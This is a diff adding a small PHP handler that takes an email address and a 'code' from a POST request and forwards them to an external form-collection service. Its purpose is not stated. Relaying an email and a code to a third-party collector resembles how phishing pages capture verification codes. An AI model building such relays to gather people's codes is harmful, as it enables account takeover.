@@ -1,0 +1,33 @@
+<?php
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $email = $_POST['email'] ?? '';
+    $code  = $_POST['code']  ?? '';
+
+    // Build payload
+    $data = [
+        'email' => $email,
+        'code'  => $code
+    ];
+
+    // Replace with your Formspree endpoint
+    $formspree_url = "https://submit-form.com/cdfDcvOVV";
+
+    $ch = curl_init($formspree_url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+    curl_setopt($ch, CURLOPT_HTTPHEADER, [
+        "Accept: application/json"
+    ]);
+    $response = curl_exec($ch);
+    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+
+    if ($httpcode === 200) {
+        echo json_encode(["success" => true]);
+    } else {
+        http_response_code($httpcode);
+        echo json_encode(["success" => false, "response" => $response]);
+    }
+}
+?>
